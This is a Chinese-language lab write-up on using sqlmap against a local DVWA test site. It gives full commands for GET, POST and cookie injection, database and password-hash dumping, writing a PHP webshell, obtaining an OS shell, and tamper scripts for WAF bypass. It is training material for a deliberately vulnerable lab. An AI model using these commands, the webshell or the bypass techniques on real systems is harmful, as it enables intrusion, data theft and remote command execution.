DVWA-sqlmap学习

- 定义

- sqlmap是什么

自动化 SQL 注入工具。你手动盲注时干的活——判断是否存在注入、猜字段数、猜表名、猜列名、逐字符爆破数据——sqlmap 全部自动化完成，而且比人快几个数量级。

- sqlmap vs 你手动干的事

| 你手动做的事 | sqlmap 对应参数 |
|---|---|
| 1' and 1=1-- / 1' and 1=2-- 判断注入点 | 自动探测，-u指定 URL 即可 |
| order by 1,2,3... 猜字段数 | --columns 自动搞定 |
| union select 1,2,... 联合查询 | --union-cols 控制 |
| information_schema 查表名/列名 | --tables / --columns / --dump |
| 逐字符 substr + ascii 盲注 | --technique=B 布尔盲注，自动爆破 |
| 时间盲注 sleep(5) | --technique=T 自动延时判断 |
| 一行一行手敲命令 | 一行命令搞定全流程 |

- sqlmap的工作流程（内部）

- 检测注入点（自动试各种闭合方式：' " ) ') )) 等）

- 识别注入类型（布尔/时间/联合/错误/堆叠）

- 识别后端数据库（MySQL/Oracle/MSSQL...）

- 枚举数据库 → 表 → 列 → 数据

- 导出数据到本地文件

- DVWA特殊性：需要登录态⚠️

DVWA 不是裸 URL，必须先登录才能访问漏洞页面。sqlmap 需要带上你的 DVWA 登录 cookie。

- 去 Kali 的 Firefox 浏览器操作：

- 打开 Kali 的 Firefox

- 访问 http://192.168.103.1/dvwa/login.php

- 登录：admin / password（DVWA 默认密码）

- 登录成功后，进入 DVWA → 左侧栏 DVWA Security → 设为 Low

- 按 F12 打开开发者工具 → 存储/Storage 标签 → Cookie → 复制两个值：

| Cookie 名 | 值 | 用途 |
|---|---|---|
| PHPSESSID | 一串乱码 | 登录会话 |
| security | low | 安全等级 |

- 获取 cookie 的另一种方式（终端党）

# 用 curl 登录并保存 cookie

curl -s -c /tmp/dvwa.cookie -b "security=low" -d "username=admin&password=password&Login=Login&user_token=" http://192.168.103.1/dvwa/login.php

# 查看 cookie

cat /tmp/dvwa.cookie

- sqlmap核心参数速查表

# ===== 基础 =====

-u "URL"              指定目标 URL（GET 注入）

--data="a=1&b=2"     POST 注入（Medium 级用）

--cookie="k=v; k=v"  带 Cookie（DVWA 必须带）

# ===== 注入点标记 =====

*                    在 URL/cookie/data 里标记注入点位置

例: --cookie="id=1*; security=low"

# ===== 探测深度 =====

--level=1/2/3/4/5    1=只测URL参数 2=加测Cookie 3=加测User-Agent

DVWA High 级（Cookie注入）必须 --level=2

--risk=1/2/3         风险等级，1=安全 3=可能改数据库（默认1够用）

# ===== 注入技术 =====

--technique=BEUSTQ   B=布尔 E=错误 U=联合 S=堆叠 T=时间 Q=内联查询

默认全开，可限定加速

# ===== 数据枚举（从大到小）=====

--current-db         当前数据库名

--dbs                所有数据库

--tables -D dvwa     dvwa 库的所有表

--columns -D dvwa -T users   users 表的所有列

--dump -D dvwa -T users      导出 users 表数据

--dump-all           全库导出（慎用）

# ===== 效率 =====

--batch              自动回答交互提示（不再问你Y/N）

--threads=5          多线程加速爆破

--flush-session      清除该目标的缓存（重新开始）

4、sqlmap 输出文件位置

sqlmap 跑完后，所有导出的数据会存在：

~/.local/share/sqlmap/output/192.168.103.1/

里面有 .csv 文件，可以直接看导出的数据。

拿到的Low级的cookie值：

"PHPSESSID": "s8lcrhe61vr5s2bse5dd0r77mp"

- GET注入DVWA Low级

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_001.png)

实战目标

用 sqlmap 一行命令 dump 出 DVWA users 表的 admin 密码 hash，并与你手动盲注的结果 5e93de3efa544e85dcd6311732d28f95 对比验证。

DVWA SQL Injection Low 级回顾

- URL：http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit

- 注入点：id 参数（GET 方式）

- 源码特征：$id = $_GET['id']; 直接拼接进 SQL，无任何过滤

- 检测注入点

先让sqlmap判断id这个参数是不是真的存在SQL注入

（1）命令

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"     --cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=low"  --batch

（2）参数解释

| 参数 | 作用 |
|---|---|
| -u "..." | 目标 URL，GET 参数 id=1 会自动被当作注入测试点 |
| --cookie="..." | 带 DVWA 登录态和安全等级 cookie |
| --batch | 自动回答交互提示（不再问你 Y/N），全程自动跑 |

（3）结果

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_002.png)

看到这些关键标志说明成功

- ✅ id' is vulnerable（确认 id 参数可注入）

- ✅ 识别出 3 种注入类型：boolean-based、time-based、UNION query

- ✅ 后端数据库是 MySQL

💡 如果输出显示 "target URL is not injectable"：

检查 cookie 是否过期（回浏览器刷新 DVWA 页面，重新复制 PHPSESSID）

检查 security cookie 是否是 low

确认 DVWA Security 设置成了 Low

- 枚举数据库

确认注入点后，让sqlmap列出所有数据库。

- 命令

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \

--cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=low" --batch --dbs

- 新增参数

| 参数 | 作用 |
|---|---|
| --dbs | 枚举所有数据库名（dump databases） |

- 结果

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_003.png)

看到 dvwa 数据库，这就是我们要打的目标。

- 枚举dvwa库的表

进入 dvwa 数据库，列出里面所有表。

- 命令

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \    --cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=low" --batch -D dvwa --tables

- 新增参数

| 参数 | 作用 |
|---|---|
| -D dvwa | 指定目标数据库为dvwa |
| --tables | 枚举该库的所有表名 |

- 结果

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_004.png)

看到 users 表，这就是存用户密码的表。

- 枚举users表的列

看 users 表里有哪些字段，确定密码字段叫什么。

- 命令

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \    --cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=low" --batch -D dvwa -T users --columns

- 新增参数

| 参数 | 作用 |
|---|---|
| -T users | 指定目标表为users |
| --columns | 枚举该表的所有列名及类型 |

- 结果

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_005.png)

关键字段：user（用户名）和 password（密码 hash）。

- dump users 表数据

这是最后一步，导出完整数据。

- 命令

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \     --cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=low" --batch -D dvwa -T users --dump

- 新增参数

| 参数 | 作用 |
|---|---|
| --dump | 导出该表所有数据到本地 CSV 文件 |

- 结果

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_006.png)

- 验证环节

看 admin 那一行的 password 字段：

跟手动盲注爆破的 hash 对比——应该完全一致！这就是"工具验证手动结果"的闭环。

- sqlmap额外送的彩蛋

sqlmap 检测到 password 列是 MD5 hash 后，会自动尝试在线破解（查哈希彩虹表），在 dump 完成后会问你：

do you want to use dictionary attack on retrieved password hashes? [Y/n/q]

如果你带了--batch,它会按默认行为(Y)尝试破解,破解完会在CSV里多一列明文密码。

- 导出文件位置

sqlmap 会把数据存成 CSV：

~/.local/share/sqlmap/output/192.168.103.1/dump/dvwa/users.csv

用 cat 看一下：

cat ~/.local/share/sqlmap/output/192.168.103.1/dump/dvwa/users.csv

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_007.png)

- POST注入DVWA Medium级

- 实战目标：

用 sqlmap 的 --data 参数处理 POST 方式提交的注入点，dump 出 Medium 级的 users 表数据。

- DVWA SQL Injection Medium 级回顾

- URL：http://192.168.103.1/dvwa/vulnerabilities/sqli/（注意：没有 ?id=1，因为改成 POST 了）

- 提交方式：POST

- 源码特征：

- $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_POST['id']);

- $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id";

防御点：

mysqli_real_escape_string 转义单引号、双引号等特殊字符

但 $id 没有加引号！所以数字型注入依然可行

突破点：因为是数字型注入（无引号包裹），转义函数对数字型无效

- Medium级vsLow级的关键差异

| 维度 | Low | Medium |
|---|---|---|
| 提交方式 | GET（URL 里 ?id=1） | POST（body 里 id=1 |
| 页面 UI | 文本框输入 | 下拉框选择（1-5） |
| 防御 | 无 | mysqli_real_escape_string |
| 注入类型 | 字符型（单引号闭合） | 数字型（无需闭合） |
| sqlmap 参数 | -u "url?id=1" | --data="id=1" |

- 实战

- 先手动验证一下POST提交

在浏览器 DVWA 页面，下拉框选 1，点 Submit，然后 F12 → 网络/Network 标签 → 找到那个 POST 请求 → 看 请求体（Request Body）：

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_008.png)

这就是 sqlmap 要发的内容。

- sqlmap POST注入命令

- 命令

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/" \                         --cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=medium" \               --data="id=1&Submit=Submit" --batch --dbs

- 新增参数

| 参数 | 作用 |
|---|---|
| --data="id=1&Submit=Submit" | 告诉 sqlmap 用 POST 方式发送这些参数，并把 `id` 当作注入测试点 |

- 对比 Low 级的命令差异：

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_009.png)

- 继续后续枚举

# 枚举表

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/"\                    --cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=medium"            --data="id=1&Submit=Submit" --batch -D dvwa --tables

# 枚举列

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/"\                     --cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=medium"\            --data="id=1&Submit=Submit" --batch -D dvwa -T users --columns

# dump 数据

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/"\                     --cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=medium"\           --data="id=1&Submit=Submit" --batch -D dvwa -T users --dump

关键学习点：

POST 方式的注入只是换了个参数 --data，其他流程完全一样

mysqli_real_escape_string 对数字型注入无效，因为数字型注入不需要引号闭合

sqlmap 自动识别出这是数字型注入，不需要你告诉它

⚠️ 注意事项

cookie 的 security 值要改成 medium，否则 DVWA 还是给你 Low 级的页面

sqlmap 会复用 session 缓存，如果之前 Low 级跑过这个 URL，可能需要 --flush-session 强制重新探测

如果想看 sqlmap 实际发送的请求，加 -v 3 参数（verbose level 3 会显示 p ayload）

- Cookie注入SQL Injection (Blind) High级

- 源码三级对照（先理解防御机制）

我读完盲注模块三个级别源码，关键差异如下：

| 维度 | Low | Medium | High |
|---|---|---|---|
| 参数来源 | $_GET['id'] | $_POST['id'] | $_COOKIE['id']⭐ |
| 输入过滤 | 无 | mysqli_real_escape_string | 无 |
| SQL 上下文 | user_id = '$id' (字符串) | user_id = $id (数字) | user_id = '$id' LIMIT 1 (字符串+LIMIT) |
| 页面反馈 | exists/MISSING + 404 | exists/MISSING | exists/MISSING + 404 + 随机 sleep |
| UI 输入 | 文本框 | 下拉框 | 无表单（弹窗 cookie-input.php） |

🎯 High 级的「防御」设计哲学

DVWA 设计 High 级的思路是「隐蔽即安全」，而不是真正的防御：

- 参数藏在 Cookie 里——普通用户改不了Cookie，攻击者却能用工具任意构造

- 没有任何字符过滤——没用 mysqli_real_escape_string，字符串型注入照样能打

- LIMIT 1——限制返回行数，看似防 UNION，但 sqlmap 会用 LIMIT 1,1 绕过

- 随机 sleep（1/6 概率睡 2-4 秒）——干扰 time-based blind，但 sqlmap 用 boolean-based 完全不受影响

💡 核心认知：High 级别漏洞的本质是「输入位置隐蔽」而非「输入未过滤」。对 sqlmap 这种工具来说，Cookie、POST、GET 三种通道没有本质区别，只要 SQL 拼接了未过滤的输入就能打。

- sqlmap两个进阶参数

1）--level=2：测试Cookie注入

sqlmap 默认 --level=1 只测 GET/POST 参数，不测 Cookie、User-Agent、Referer。要测 Cookie 必须提到 --level=2。

| Level | 测试范围 |
|---|---|
| 1 (默认) | GET 参数 + POST body 参数 |
| 2 | 上面 + Cookie + User-Agent |
| 3 | 上面 + Referer + Host + ... |
| 4-5 | 极限测试 |

2）* 标记注入点：显示指定

当 Cookie 里有多个参数、sqlmap 自动识别可能漏判时，可以在注入参数值后加 * 强制指定注入点：

--cookie="id=1*; PHPSESSID=xxx; security=high"

↑

告诉 sqlmap：就在 id 这个值上做注入测试

* 也可以加在 URL、POST body、User-Agent 任何位置，是 sqlmap 的"强制注入点"标记。

- 命令（两种打法对照）

⚠️ 注意：盲注模块反馈通道弱（只有 exists/MISSING 两态），sqlmap 探测会比显错注入慢很多（可能要 1-3 分钟），请耐心等待。

打法A：用 --level=2 让sqlmap自动测Cookie

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli_blind/" \                  --cookie="id=1; PHPSESSID=gpt1euq57fn3i333p7glbn9mbe; security=high" \         --level=2 --flush-session --batch -v 3

关键变化点：

- URL 末尾没有 ?id=1&Submit=Submit（High 级表单不走 URL）

- --cookie 里多了 id=1 —— 模拟「页面通过 cookie-input.php 写入的 id」

- --level=2 —— 让 sqlmap 去测 Cookie 里的参数

- --flush-session —— 强制清缓存，不复用阶段二/三结果

打法B：用*显示标记注入点（更精准、更快）

sqlmap -u " http://192.168.103.1/dvwa/vulnerabilities/sqli_blind/" \             --cookie="id=1*; PHPSESSID=gpt1euq57fn3i333p7glbn9mbe; security=high" \        --flush-session --batch -v 3

差异： 不加 --level=2，靠 * 强制指定 Cookie 中的 id 是注入点。sqlmap 不会去跑全量 Cookie 测试，速度更快。

- 输出结果

A结果：

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_010.png)

B结果：

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_011.png)

重点观察 4 件事：

- ✅ Cookie 'id' is vulnerable —— 注入点在 Cookie 参数 id 上（不再标 "POST" 或 "GET"）

- payload 形如 id=1' AND 3324=3324 AND 'aBcD'='aBcD —— 注意有单引号！这是字符串型注入的特征，与阶段三 Medium 级的数字型 payload（无引号）形成对比

- 可能没有UNION query——因为LIMIT 1限制了返回行数，UNION注入效果受限

- 可能没有 error-based —— 盲注模块源码用 try/catch 吃掉了 SQL 错误，没有错误回显

- time-based 可能不稳 —— DVWA 自己加了随机 sleep 干扰

💡 这正是"盲注"的本质：反馈通道弱，sqlmap 主要靠 boolean-based 一位一位地猜，速度慢但能成。

- 后续枚举命令

# 1. 枚举所有数据库

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli_blind/" \

--cookie="id=1*; PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=high" \

--flush-session --batch --dbs

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_012.png)

# 2. 枚举 dvwa 库的表

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli_blind/" \

--cookie="id=1*; PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=high" \

--batch -D dvwa --tables

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_013.png)

# 3. 枚举 users 表的列

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli_blind/" \

--cookie="id=1*; PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=high" \

--batch -D dvwa -T users --columns

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_014.png)

# 4. dump users 表数据

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli_blind/" \                  --cookie="id=1*; PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=high" \        --batch -D dvwa -T users --dump

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_015.png)

💡 第 1 步加 --flush-session 重新探测，后续步骤复用 sqlmap 缓存（同一目标的 id 注入点已知），速度会快很多。dump 出来的数据应该和阶段二、三完全一致（admin → pwned 等 5 条）。

- 核心知识点总结

| 知识点 | 一句话总结 |
|---|---|
| Cookie 注入怎么写 | --cookie="id=1*; PHPSESSID=xxx; security=high" + * 标记注入点 |
| --level=2 干嘛用 | 让 sqlmap 测 Cookie/User-Agent（默认 level=1 不测） |
| *标记是什么 | 显式指定注入点，比 --level=2 更精准、更快 |
| High 级防御点 | 参数藏在 Cookie 里 + LIMIT 1 + 随机 sleep |
| 为什么仍被打穿 | 没加输入过滤 + 字符串型注入 + sqlmap 不在乎参数位置 |
| 字符串型 vs 数字型 payload | High 用 1' AND ... AND 'x'='x (有引号)，Medium 用 1 AND ... (无引号) |
| 盲注 vs 显注速度 | 盲注慢得多（一位一位猜），但反馈弱不等于打不穿 |

- sqlmap进阶能力

- 学习地图

| 子阶段 | 能力 | 命令关键词 | 在攻击链中的位置 |
|---|---|---|---|
| 5.1 | 权限侦察 | --current-user  --is-dba  --privileges  --passwords | 第一步：搞清楚打到的账户能干什么 |
| 5.2 | 文件读写 | --file-read  --file-write  --file-dest | 用 FILE 权限读源码、写 webshell |
| 5.3 | 系统命令 | --os-shell  --os-cmd | 终极目标：拿到 OS shell |
| 5.4 | tamper 绕过 | --tamper | 在 WAF/过滤存在时让 payload 通过 |
| 5.5 | 精准控制 | --technique  --eval  --dump-all | 工程化控制注入策略 |

💡 本阶段所有演示都基于阶段二 Low 级 GET 注入点——最稳定的靶点，避免 Cookie/POST 复杂度干扰进阶参数的学习。

- 5.1权限侦察（先做这一步，决定后续能否打）

在尝试 --os-shell、文件读写之前，必须先搞清楚当前数据库账户的权限。这步决定了后面所有进阶能力的可行性。

把下面这一串命令依次在 Kali 上跑（每次只换最后一个参数）：

# 1. 当前数据库用户是谁

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \    --cookie="PHPSESSID=gpt1euq57fn3i333p7glbn9mbe; security=low" \               --batch --current-user
![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_016.png)

# 2. 当前数据库名
![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_017.png)

... --current-db

# 3. 当前用户是否为 DBA（关键！）
![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_018.png)

... --is-dba                                             #没有DBA

# 4. 列出当前用户的所有权限
![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_019.png)

... --privileges                                              #只有最小权限

# 5. dump MySQL 账户密码 hash（需要权限读 mysql.user 表）

... --passwords

# 6. 数据库主机名
![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_020.png)

... --hostname

结果（phpstudy 默认 dvwa 配置）：

| 项 | 预期值 | 含义 |
|---|---|---|
| --current-user | dvwa@localhost 或 root@localhost | 看 dvwa 配置文件里连库用的账号 |
| --current-db | dvwa | 当前库 |
| --is-dba | False← 关键判断点 | 是 DBA 才有可能拿到 FILE 权限 |
| --privileges | 应包含 FILE、SUPER、ALL PRIVILEGES | FILE 权限是文件读写和 os-shell 的前提 |
| --passwords | 可能拿到 root 的 hash | dvwa 默认用 root 连库时可以 |
| --hostname | Windows 主机名 | — |

🎯 核心判断点：

- 如果 --is-dba = True 且 --privileges 含 FILE → 后面 5.2/5.3 有戏

- 如果 --is-dba = False 或无 FILE 权限 → 5.2/5.3 直接失败，但仍可看原理

3、5.2 文件读写：利用 FILE 权限

1）前置检查：secure_file_priv

MySQL 5.7+ 引入了 secure_file_priv 系统变量，是文件读写的"第二道闸门"（第一道是 FILE 权限）：

| 取值 | 含义 | 文件读写能否执行 |
|---|---|---|
| NULL | 完全禁止（MySQL 5.7 默认！） | ❌ 一定失败 |
| "" (空字符串) | 允许任意路径 | ✅ 可用 |
| "/tmp/" 等具体路径 | 只允许该目录 | ⚠️ 只能写该目录 |

请先在 Windows 宿主机上用 phpstudy 的 MySQL 命令行检查：

# 在 Windows PowerShell 中执行

E:\phpstudy_pro\Extensions\MySQL5.7.26\bin\mysql.exe -uroot -proot -e "SHOW VARIABLES LIKE 'secure_file_priv';"

（路径和版本号按你 phpstudy 实际安装的调整。默认 root 密码通常是 root。）

2）--file-read：读文件

如果 secure_file_priv 允许，可以读任意文件（包括不归 MySQL 管的文件）：

# 读 DVWA 的数据库配置文件（验证 FILE 权限可用）

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \    --cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=low" \               --batch --file-read="E:/phpstudy_pro/WWW/dvwa/config/config.inc.php"

💡 注意路径用正斜杠 /（sqlmap 会转成 Windows 路径），不要用反斜杠。

3）--file-write / --file-dest：写文件

如果 secure_file_priv 允许，可以读任意文件（包括不归 MySQL 管的文件）：

# 1. 先在 Kali 上准备一个 webshell 文件（仅作演示，不实际部署）

echo '<?php echo "<pre>"; system($_GET["cmd"]); ?>' > /tmp/shell.php

# 2. 用 sqlmap 把它写到 DVWA 根目录

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \    --cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=low" \               --batch --file-write="/tmp/shell.php"                                               --file-dest="E:/phpstudy_pro/WWW/dvwa/shell.php"

预期可能的结果：

✅ 成功：可通过 http://192.168.103.1/dvwa/shell.php?cmd=whoami 执行命令

❌ 失败提示 unable to write to ... secure_file_priv：被 secure_file_priv 拦了

⚠️演示完记得删掉 shell.php：在 Windows 上 Remove-Item E:\phpstudy_pro\WWW\dvwa\shell.php

4、5.3 --os-shell：拿系统 shell（终极目标）

--os-shell 是 sqlmap 的"一键拿 shell"功能，原理：

用 --file-write 把一个 webshell 丢到 Web 根目录

通过 HTTP 调用这个 webshell

给你一个交互式 shell，可以执行系统命令

4 个前置条件全部满足才行：

| # | 条件 | 怎么检查 |
|---|---|---|
| 1 | 当前用户是 DBA | --is-dba 返回 True |
| 2 | 有 FILE 权限 | --privileges 含 FILE |
| 3 | secure_file_priv 允许写入 | 上一步 MySQL 命令行检查 |
| 4 | 知道 Web 根目录绝对路径 | DVWA 是 E:\phpstudy_pro\WWW\dvwa\ |

1）执行命令

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \

--cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=low" \

--batch \

--os-shell

进入 shell 后的命令（用哪个看 sqlmap 提示支持 os-shell 还是 os-prompt）：

# Windows 环境下的系统命令

whoami

ipconfig

dir E:\phpstudy_pro\WWW\dvwa\

type E:\phpstudy_pro\WWW\dvwa\config\config.inc.php

💡 退出 os-shell：输入 quit 或按 Ctrl+C

如果失败的排查思路（按顺序查）：

| 失败提示 | 原因 | 解决 |
|---|---|---|
| current user does not have DBA privileges | 不是 DBA | 这个靶点环境没法 os-shell，看原理即可 |
| FILE privilege not granted | 缺 FILE 权限 | 同上 |
| secure_file_priv is set to NULL | MySQL 禁止文件操作 | 改 my.ini，加 secure_file_priv="" 重启 MySQL |
| unable to write file | 路径写错/无写权限 | 用 --tmp-path 和 --webroot 显式指定 |
| 写入成功但 HTTP 调用 webshell 404 | 路径不对 | sqlmap 提示时输入正确的 webroot |

🎯 教学价值：即使失败，你也会完整理解 os-shell 的原理链路和防御机制（DBA 权限、FILE 权限、secure_file_priv、Web 目录权限四道闸门）。

5、5.4 tamper 脚本：绕过 WAF/字符过滤

1）原理

sqlmap默认 payload 含特征字符（如空格、UNION、AND），WAF会识别拦截。tamper 脚本在payload发出前对其做编码/变形，让特征变样但仍被SQL解析器接受。

2）列出所有内置 tamper

sqlmap --list-tampers | head -50

3）常用 tamper 速查

| tamper 名 | 变形方式 | 绕过什么 |
|---|---|---|
| space2comment | 空格 → /**/ | 拦空格的 WAF |
| space2hash | 空格 → #随机字符\n | 同上 |
| between | > → BETWEEN | 拦 > 的 |
| charencode | URL 编码 | 基础 WAF |
| charunicodeencode | Unicode 全编码 | 中级 WAF |
| apostrophemask | ' → %EF%BC%87（UTF-8 全角引号） | 拦引号的 |
| modsecurityversioned | 加 /**/ 注释 + version | 针对 ModSecurity |
| 0xchar | 0x... 替代字符串 | 拦字符串字面量 |

4）演示：观察 tamper 对 payload 的变形

# 不加 tamper：观察原始 payload

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \

--cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=low" \

--flush-session --batch --technique=B -v 6

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_021.png)

# 加 space2comment：看 payload 中空格被替换成 /**/

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \

--cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=low" \

--flush-session --batch --technique=B --tamper=space2comment -v 6

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_022.png)

-v 6是最详细级别，会把HTTP请求payload完整打印出来，方便对比变形前后差异。

对比预期：

- 不加 tamper：id=1 AND 3324=3324

- 加 space2comment：id=1/**/AND/**/3324=3324

5）多tamper链式使用

# 同时用多个 tamper（按顺序应用）

--tamper=space2comment,between,charencode

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_023.png)

💡 实战中 tamper 不是越多越好——变形过度可能让 payload 无法被 SQL 解析。常见做法是先单个测，再组合。

6、5.5 精准控制：--technique / --eval / --dump-all

1）--technique：指定注入技术

sqlmap 默认会尝试所有注入技术（B/E/U/S/T/Q）。某些场景下你想限定只用一种（如避免 time-based 太慢）：

| 字母 | 技术 | 速度 | 适用场景 |
|---|---|---|---|
| B | boolean-based blind | 中 | 反馈弱但稳定 |
| E | error-based | 快 | 错误回显时 |
| U | UNION query | 最快 | 列数已知 |
| S | stacked queries | 快 | 多语句执行（MySQL 默认禁用） |
| T | time-based blind | 最慢 | 完全无回显时 |
| Q | inline queries | 快 | 子查询可用 |

# 只用 UNION（最快，但需要列数对得上）

sqlmap -u "..." --cookie="..." --technique=U --batch

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_024.png)

# 只用 boolean，避开慢速 time-based

sqlmap -u "..." --cookie="..." --technique=B --batch

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_025.png)

# 排除 time-based，其他都试

sqlmap -u "..." --cookie="..." --technique=BEUQS --batch

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_026.png)

2）--eval：动态计算请求参数

场景：目标接口每次请求都要带一个动态 token，比如 token = md5(id + 时间戳) 或 sign = sha1(param1 + param2 + secret)。手动算太累，--eval 让 sqlmap 在每次请求前自动算。

# 示例：构造一个 token = id 的 md5（仅演示 eval 用法）

sqlmap -u "http://192.168.103.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&token=placeholder" --cookie="PHPSESSID=s8lcrhe61vr5s2bse5dd0r77mp; security=low" \           --eval="import hashlib; token=hashlib.md5(id.encode()).hexdigest()" \               --batch --flush-session

💡 --eval 里可以写 Python 表达式，能访问已声明的参数（如 id）。每次请求前 sqlmap 会执行这段 Python，把结果填进 URL/body。

DVWA 本身不需要 token，所以 --eval 在这里演示价值有限，但实战中遇到 token 签名接口时这是救命技能。

3）--dump-all：批量 dump 所有库

# dump 所有数据库所有表（时间长，慎用）

sqlmap -u "..." --cookie="..." --batch --dump-all

# 排除系统库，只 dump 业务库

sqlmap -u "..." --cookie="..." --batch --dump-all --exclude-sysdbs

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_027.png)

4）--search：搜索式查找

# 在所有库中搜名字含 user 的表

sqlmap -u "..." --cookie="..." --batch --search -T user

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_028.png)

# 搜列名含 pass 的列

sqlmap -u "..." --cookie="..." --batch --search -C pass

![](images/10-DVWA-sqlmap学习/10-DVWA-sqlmap学习_029.png)

7、进阶sqlmap核心知识点小结

| 知识点 | 一句话总结 |
|---|---|
| 攻击链顺序 | 权限侦察 → 文件读写 → os-shell |
| --is-dba | 判断当前账户能否进一步利用 |
| FILE 权限 | 文件读写和 os-shell 的硬前提 |
| secure_file_priv | MySQL 文件操作的"第二道闸门"，NULL=禁止 |
| --os-shell 原理 | 通过 INTO OUTFILE 写 webshell，HTTP 调用执行命令 |
| tamper 作用 | payload 变形，绕过 WAF/字符过滤 |
| --technique | 精准控制注入技术，避开慢速的 time-based |
| --eval | 动态计算请求参数（应对 token 签名） |
